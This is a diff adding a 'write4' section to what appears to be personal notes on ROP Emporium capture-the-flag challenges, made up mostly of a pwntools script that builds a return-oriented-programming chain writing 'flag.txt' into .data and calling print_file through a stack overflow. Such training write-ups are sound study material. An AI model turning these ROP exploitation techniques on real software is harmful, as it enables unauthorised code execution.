@@ -65,3 +65,60 @@ proc.interactive()
 ## split
 
 //TODO 
+
+
+## write4
+
+
+```python
+    # ::::::::::: .data at this address is uninitialized ::::::::::
+    
+    #data_section = elf.get_section_by_name('.data').header.sh_addr
+    
+    # better way
+    data_section = elf.symbols.data_start
+    log.success(f".data starts @{hex(data_section)}")
+    # :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+    # :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::
+    
+    # pwntools hides some gadgets from us so we resolve via
+    # function
+    mov_gadget = elf.symbols['usefulGadgets']
+    log.success(f"gadget: mov [edi], ebp; ret; @ {mov_gadget}")
+    
+    # this lookup fails if the list of registers to pop cannot 
+    # be met
+    pop_gadget = rop.search(0, ['edi', 'ebp'], 'regs').address
+    log.success(f"pop gadget: pop edi; pop ebp; ret; @ {hex(pop_gadget)}")
+
+    print("\n")
+    log.info("::: Beginning write sequence for 'flag.txt' ::: \n")
+    log.info("Writing .data address to edi, 'flag' to ebp ...")
+    # :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+    # :::::::::::::::::::::::: create chain :::::::::::::::::::::::
+    rop.raw([
+        pop_gadget,             # pop edi; pop ebp; ret;
+        data_section,
+        'flag',                 # write first 4 bytes of 'flag.txt'
+        mov_gadget,             # mov [edi], ebp; ret;
+
+        pop_gadget,             # pop edi; pop ebp; ret;
+        data_section + 4,
+        '.txt',                 
+        mov_gadget              # mov [edi], ebp; ret;
+    ])
+    # printfile arg in .data
+    rop.print_file(data_section)                     
+
+    payload = fit({
+        cyclic_find('laaa'): rop.chain()
+    })
+
+    # :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+    
+    # shellit
+    proc.sendlineafter('> ', payload)    
+    proc.interactive()
+```
